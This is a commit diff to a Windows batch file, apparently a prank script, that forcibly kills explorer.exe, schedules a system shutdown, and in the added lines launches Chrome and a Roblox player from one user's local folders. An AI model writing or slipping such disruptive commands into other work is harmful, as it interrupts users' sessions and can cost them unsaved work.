c0d5276d5668b4976bd432e1cdfc3555c98e2014
ArisTechXD <venkowindowsyt@gmail.com>
2024-07-19 09:43:49 -0700

    Add files via upload

--- Clyporbotor/Clyporbotor.bat
+++ Clyporbotor/Clyporbotor.bat
@@ -1,2 +1,4 @@
 taskkill /im explorer.exe /f
 shutdown /s /t 1002
+C:\Users\ArisTech\AppData\Local\Google\Chrome\Application\chrome.exe
+C:\Users\ArisTech\AppData\Local\Roblox\Versions\version-0148e7f69b394963\RobloxPlayerBeta.exe
